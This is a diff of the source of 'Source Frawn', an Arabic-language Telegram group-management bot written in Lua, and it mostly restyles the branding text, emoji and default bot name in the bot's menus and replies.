 '\n'..' ❍   الصوت » { '..lock_muse..
 ' }\n'..' ❍  الملصقات » { '..lock_ste..
 ' }\n'..' ❍  الجهات » { '..lock_phon..
@@ -8352,10 +8391,10 @@ local text =
 ' }\n'..' ❍  التكرار » { '..flood..
 ' }\n'..' ❍  الترحيب » { '..welcome..
 ' }\n'..' ❍  عدد التكرار » { '..NUM_MSG_MAX..
-' }\nء≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫'..
+' }\nء≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫'..
 '\n ❍  علامة ال {🔓} تعني مفعل'..
 '\n ❍  علامة ال {🔐} تعني معطل'..
-'\nء≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫'..
+'\nء≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫'..
 '\n'..' ❍  امر صيح » { '..kickme..
 ' }\n'..' ❍  امر اطردني » { '..sehuser..
 ' }\n'..' ❍  امر منو ضافني » { '..addme..
@@ -8364,7 +8403,7 @@ local text =
 ' }\n'..' ❍  الايدي » { '..idgp..
 ' }\n'..' ❍ الايدي بالصوره » { '..idph..
 ' }\n'..' ❍  الرفع » { '..setadd..
--- ' }\n'..' ❍  الحظر » { '..banm..' }\n\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n ❍ قناة سورس فرعون ↓\n [ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍](t.me/source_frawn) \n'
+-- ' }\n'..' ❍  الحظر » { '..banm..' }\n\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n ❍ قناة سورس فرعون ↓\n [ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡](t.me/source_frawn) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -8523,12 +8562,12 @@ return false
 end
 local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
 if link then                              
-send(msg.chat_id_,msg.id_,'\n☠⟼⟼⟼𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍⟻⟻⟻☠\n ['..link..']')                          
+send(msg.chat_id_,msg.id_,'\n🇪🇬⟼⟼⟼𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⟻⟻⟻🇪🇬\n ['..link..']')                          
 else                
 local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if linkgpp.ok == true then 
 database:set(bot_id.."Private:Group:Link"..msg.chat_id_,linkgpp.result)
-linkgp = '\n☠⟼⟼⟼𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍⟻⟻⟻☠\n ['..linkgpp.result..']'
+linkgp = '\n🇪🇬⟼⟼⟼𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡⟻⟻⟻🇪🇬\n ['..linkgpp.result..']'
 else
 linkgp = ' ❍ لا يوجد رابط ارسل ضع رابط'
 end  
@@ -8741,7 +8780,7 @@ end
 
 if text == "قائمه المنع" and Manager(msg) then   
 local list = database:smembers(bot_id.."DRAGON1:List:Filter"..msg.chat_id_)  
-t = "\n ❍ قائمة المنع \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة المنع \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do  
 local DRAGON_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..v..msg.chat_id_)   
 t = t..""..k.."- "..v.." » {"..DRAGON_Msg.."}\n"    
@@ -8887,7 +8926,7 @@ return false
 end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
 local admins = result.members_  
-text = "\n ❍ قائمة البوتات الموجوده \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+text = "\n ❍ قائمة البوتات الموجوده \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 local n = 0
 local t = 0
 for i=0 , #admins do 
@@ -8906,7 +8945,7 @@ send(msg.chat_id_, msg.id_, " ❍ لا توجد بوتات في الجروب")
 return false 
 end
 if #admins == i then 
-local a = '\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n ❍ عدد البوتات التي هنا >> {'..n..'} بوت\n'
+local a = '\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n ❍ عدد البوتات التي هنا >> {'..n..'} بوت\n'
 local f = ' ❍ عدد البوتات التي هي ادمن >> {'..t..'}\n ❍ ملاحضه علامة ال (❍) تعني ان البوت ادمن \n'
 send(msg.chat_id_, msg.id_, text..a..f)
 end
@@ -8995,7 +9034,7 @@ if #list == 0 then
 send(msg.chat_id_, msg.id_,' ❍ لا توجد صلاحيات مضافه')
 return false
 end
-t = "\n ❍ قائمة الصلاحيات المضافه \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n ❍ قائمة الصلاحيات المضافه \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
 if var then
@@ -9415,8 +9454,8 @@ end
 return false
 end
 
-if text == ""..(database:get(bot_id..'Name:Bot') or 'اليكس').."" then  
-Namebot = (database:get(bot_id..'Name:Bot') or 'اليكس')
+if text == ""..(database:get(bot_id..'Name:Bot') or 'فرعون').."" then  
+Namebot = (database:get(bot_id..'Name:Bot') or 'يوسف')
 local DRAGON_Msg = {
 'ننعم يروحي 😻💙',
 'نعم يا قلب  '..Namebot..'',
@@ -9732,7 +9771,7 @@ end
 
 if text == ("الردود العامه") and DevSoFi(msg) then 
 local list = database:smembers(bot_id..'List:Rd:Sudo')
-text = "\n ❍ قائمة الردود العامه \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+text = "\n ❍ قائمة الردود العامه \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
 db = 'متحركه'
@@ -9956,7 +9995,7 @@ end
 
 if text == ("الردود") and Manager(msg) then
 local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
-text = " ❍ قائمه الردود \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+text = " ❍ قائمه الردود \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
 db = 'متحركه'
@@ -10227,7 +10266,7 @@ PRo = '❴ ✔️ ❵'
 else
 PRo = '❴ ✖ ❵'
 end 
-send(msg.chat_id_, msg.id_,'\n ❍صلاحيات البوت هي\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n❍  علامة ال {✔️} تعني مفعل\n❍  علامة ال {✖} تعني غير مفعل\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n❍تغير معلومات المجموعة ↞ '..INf..'\n❍حذف الرسائل ↞ '..DEL..'\n❍حظر المستخدمين ↞ '..REs..'\n❍دعوة المستخدمين ↞ '..INv..'\n❍ثتبيت الرسالة ↞ '..Pin..'\n❍اضافة مشرفين ↞ '..PRo)   
+send(msg.chat_id_, msg.id_,'\n ❍صلاحيات البوت هي\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n❍  علامة ال {✔️} تعني مفعل\n❍  علامة ال {✖} تعني غير مفعل\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n❍تغير معلومات المجموعة ↞ '..INf..'\n❍حذف الرسائل ↞ '..DEL..'\n❍حظر المستخدمين ↞ '..REs..'\n❍دعوة المستخدمين ↞ '..INv..'\n❍ثتبيت الرسالة ↞ '..Pin..'\n❍اضافة مشرفين ↞ '..PRo)   
 end
 end
 if text == "تعطيل الانستا" and Manager(msg) then
@@ -10268,7 +10307,7 @@ User_id = "@"..b.username_
 else
 User_id = msg.sender_user_id_
 end --الكود حصري سورس فرعون يعني لو بكتهن راح اعرفك انت الاخذتهن
-local t = "\n❍المستخدم ~ ["..User_id .."] يصيح المشرفين \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+local t = "\n❍المستخدم ~ ["..User_id .."] يصيح المشرفين \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 k = 0
 for i,v in pairs(data.members_) do
 if bot_id ~= v.user_id_ then 
@@ -10310,7 +10349,7 @@ end
 return false
 end
 local list = database:smembers(bot_id.."botss:DRAGON:List:Rd:Sudo")
-text = "\nقائمة ردود المتعدده \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+text = "\nقائمة ردود المتعدده \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖?? 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 for k,v in pairs(list) do
 db = "رساله "
 text = text..""..k.." => {"..v.."} => {"..db.."}\n"
@@ -11850,7 +11889,7 @@ local Text =[[
 
 
 اوامر سورس فرعون الاوامر خاصه ب الادمن 🕹️
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
+[🇪🇬 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -11897,14 +11936,14 @@ return false
 end
 local Text =[[
 *اهلا انتツفي اضافات البوت*
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ٴ*
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ٴ*
 * يمكنك معرفة حاله تفعيل الاضافات *
 * من خلال ارسال حاله الاضافات *
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫*
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫*
 *يمكنك تصفح الاضافات من خلال*
 *الكيبورد الموجود في الأسفل*
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫*
-[ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ](t.me/source_frawn)
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫*
+[🇪🇬𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -11915,7 +11954,7 @@ keyboard.inline_keyboard = {
 {text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡', url="t.me/source_frawn"},
 {text = 'مبرمج السورس', url="t.me/DEV_FRAWN"},
 },
 }
@@ -11936,13 +11975,13 @@ if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." sofi:zhrf
 local TextZhrfa = text:match("^زخرفه (.*)$")
 zh = https.request('https://rudi-dev.tk/Amir1/Boyka.php?en='..URL.escape(TextZhrfa)..'')
 zx = JSON.decode(zh)
-t = "\n❍قائمه الزخرفه \n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n"
+t = "\n❍قائمه الزخرفه \n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n"
 i = 0
 for k,v in pairs(zx.ok) do
 i = i + 1
 t = t..i.."-  `"..v.."` \n"
 end
-send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n ❍[𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ](t.me/source_frawn)❍ ')
+send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n ❍[𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ](t.me/source_frawn)❍ ')
 end
 if text == "تعطيل الابراج" and Manager(msg) then
 send(msg.chat_id_, msg.id_, '❍ تم تعطيل الابراج')
@@ -12046,7 +12085,7 @@ send(msg.chat_id_, msg.id_,Text)
 end
 if text == 'بوت حذف' or text == 'رابط حذف' or text == 'رابط الحذف' then
 local Text = [[
-❍𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍❍
+🇪🇬𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡🇪🇬
 بوت حذف حساب ❍
 فكر قبل لا تتسرع وتروح
 ]]
@@ -12118,10 +12157,10 @@ https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callb
 return false
 end
 local Teext =[[
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 قفل + فتح ← الامر… 
 ❍← { بالتقيد ، بالطرد ، بالكتم }
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ الروابط
 ❍المعرف
 ❍ التاك
@@ -12132,7 +12171,7 @@ local Teext =[[
 ❍الملفات
 ❍الصور
 ❍ التفليش
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ الماركداون
 ❍ البوتات
 ❍الاباحي
@@ -12143,14 +12182,14 @@ local Teext =[[
 ❍الفيديو
 ❍الانلاين
 ❍الدردشه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍التوجيه
 ❍الاغاني
 ❍الصوت
 ❍الجهات
 ❍ الاشعارات
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍ ](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12186,9 +12225,9 @@ return false
 end
 local Teext =[[
 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺ 
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺ 
 ❍ اوامر تفعيل وتعطيل ❍
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ اطردني
 ❍صيح
 ❍ضافني
@@ -12217,8 +12256,8 @@ local Teext =[[
 ❍ ردود البوت
 ❍ اوامر التسليه 
 ❍ صورتي 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12254,14 +12293,14 @@ return false
 end
 local Teext =[[
 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺ 
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺ 
 ❍ اوامر الوضع ❍ - اضف
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍اضف / مسح ← رد
 ❍اضف / مسح ← صلاحيه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ضع + امر …
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍اسم
 ❍رابط
 ❍ ترحيب
@@ -12270,11 +12309,11 @@ local Teext =[[
 ❍صوره
 ❍وصف
 ❍تكرار + عدد
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍اوامر مسح / المسح ← امر
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ مسح + امر ↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ الايدي 
 ❍ المميزين
 ❍ الادمنيه
@@ -12291,12 +12330,12 @@ local Teext =[[
 ❍قائمه منع الملصقات
 ❍ مسح قائمه المنع
 ❍ المحذوفين
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ مسح  امر + الامر القديم  
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ الاوامر المضافه ( لعرض الاوامر المضافه ) 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12332,9 +12371,9 @@ return false
 end
 local Teext =[[
 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺ 
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺ 
 ❍اوامر تنزيل ورفع
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍مميز
 ❍ادمن
 ❍مدير
@@ -12347,9 +12386,9 @@ local Teext =[[
 ❍القيود 
 ❍تنزيل جميع الرتب
 ❍تنزيل الكل 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ اوامر التغير …
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍تغير رد المطور + اسم
 ❍تغير رد المالك + اسم
 ❍تغير رد منشئ الاساسي + اسم
@@ -12359,9 +12398,9 @@ local Teext =[[
 ❍تغير رد المميز + اسم
 ❍تغير رد العضو + اسم
 ❍تغير امر الاوامر
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺ 
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺ 
 ❍ اوامر المجموعه ❍
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ استعاده الاوامر 
 ❍ تحويل كالاتي  بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
 ❍ صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
@@ -12372,7 +12411,7 @@ local Teext =[[
 ❍مسح + العدد
 ❍تنزيل الكل
 ❍تنزيل جميع الرتب
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍منع + برد
 ❍الصور + متحركه + ملصق 
 ❍حظر ~ كتم ~ تقيد ~ طرد
@@ -12387,7 +12426,7 @@ local Teext =[[
 ❍ كشف البوتات
 ❍الصلاحيات
 ❍ كشف برد ← بمعرف ← ايدي
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍تاك للكل
 ❍ وضع لقب + لقب
 ❍ مسح لقب بالرد
@@ -12407,8 +12446,8 @@ local Teext =[[
 ❍نسبه الانوثه
 ❍الساعه
 ❍التاريخ
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐁𝐀??𝐀𝐑 ━━━━━━⩺
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12445,7 +12484,7 @@ end
 local Teext =[[
 
 ❍ اوامر المطورين ❍
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ تفعيل ← تعطيل 
 ❍المجموعات ← المشتركين ← الاحصائيات
 ❍رفع ← تنزيل منشئ اساسي
@@ -12453,9 +12492,9 @@ local Teext =[[
 ❍مسح المنشئين ← المنشئين
 ❍ اسم ~ ايدي + بوت غادر 
 ❍اذاعه 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺ 
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺ 
 ❍ اوامر مطور الاساسي
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍تفعيل
 ❍تعطيل
 ❍مسح الاساسين
@@ -12465,7 +12504,7 @@ local Teext =[[
 ❍ مسح المطورين
 ❍ المطورين
 ❍ رفع | تنزيل مطور
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ اسم البوت + غادر
 ❍غادر
 ❍ اسم بوت + الرتبه
@@ -12477,13 +12516,13 @@ local Teext =[[
 ❍ مسح قائمه العام
 ❍ جلب نسخه الاحتياطيه
 ❍ رفع نسخه الاحتياطيه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍اذاعه خاص
 ❍اذاعه
 ❍اذاعه بالتوجيه
 ❍ اذاعه بالتوجيه خاص
 ❍اذاعه بالتثبيت
